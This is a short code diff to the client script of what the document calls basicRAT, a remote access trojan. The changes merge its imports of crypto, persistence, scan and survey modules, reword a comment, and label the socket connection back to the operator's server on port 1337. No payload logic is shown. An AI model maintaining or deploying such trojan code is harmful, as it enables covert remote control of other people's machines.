@@ -10,12 +10,7 @@ import socket
 import subprocess
 import sys
 
-from core import common
-from core import crypto
-from core import persistence
-from core import scan
-from core import survey
-from core import toolkit
+from core import common, crypto, persistence, scan, survey, toolkit
 
 
 # change these to suit your needs
@@ -24,7 +19,7 @@ PORT = 1337
 
 
 def main():
-    # set system platform to win, nix, mac, or unk
+    # determine system platform
     plat = sys.platform
     if plat.startswith('win'):
         plat = 'win'
@@ -35,6 +30,7 @@ def main():
     else:
         plat = 'unk'
     
+    # connect to basicRAT server
     conn = socket.socket()
     conn.connect((HOST, PORT))
     client = common.Client(conn, HOST, 1)
